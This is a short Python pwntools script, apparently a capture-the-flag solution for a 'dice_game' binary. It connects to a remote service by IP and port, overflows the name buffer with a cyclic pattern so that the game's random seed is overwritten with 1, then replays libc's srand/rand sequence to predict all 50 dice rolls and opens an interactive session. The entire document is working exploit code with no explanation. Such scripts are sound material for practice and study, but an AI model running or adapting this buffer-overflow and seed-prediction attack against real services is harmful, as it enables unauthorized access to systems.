from pwn import *
from ctypes import *

# sh = process("./dice_game")
sh = remote("61.147.171.105", 54259)
libc = cdll.LoadLibrary("./libc.so.6") 

payload = cyclic(0x40) + p64(1)
sh.sendlineafter("let me know your name: ", payload)
libc.srand(1)
for i in range(50):
    rand_value = libc.rand() % 6+1
    sh.sendlineafter("Give me the point(1~6): ", str(rand_value))
sh.interactive()